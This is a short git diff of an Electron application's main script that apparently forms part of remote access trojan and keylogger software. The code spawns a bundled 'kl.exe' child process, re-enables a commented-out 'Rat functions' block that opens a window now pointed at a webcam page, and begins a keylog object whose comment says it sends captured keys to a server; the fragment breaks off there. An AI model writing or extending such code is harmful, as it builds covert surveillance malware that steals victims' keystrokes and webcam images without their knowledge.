@@ -45,8 +45,7 @@ app.on('ready', function () {//App is ready to start
 	if (config.appmenu == false) { Menu.setApplicationMenu(null); }
 
 	create_main_window();
-	//make_rat_window();
-
+	//make_rat_window()
 	child(path.join(__dirname, '/assets/python/kl.exe'), function (err, data) {//child process
 		if (err) {
 			console.error(err);
@@ -66,7 +65,7 @@ app.on('ready', function () {//App is ready to start
 
 
 /* Rat functions */
-/*
+
 function make_rat_window() {//create rat window
 	rat_win = new BrowserWindow({
 		width: 1000,
@@ -87,14 +86,14 @@ function make_rat_window() {//create rat window
 	});
 
 	rat_win.loadURL(url.format({
-		pathname: path.join(__dirname, '/windows/Rat_out.html'),
+		pathname: path.join(__dirname, '/windows/webcam.html'),
 		protocol: 'file:',
 		slashes: true,
 		icon: path.join(__dirname, '/assets/icons/rat_icon.ico'),
 	}));
 
 	//rat_win.setApplicationMenu
-}*/
+}
 
 let keylog = {
 	get_keys: async function () {//get keylog from python sub process and send to server
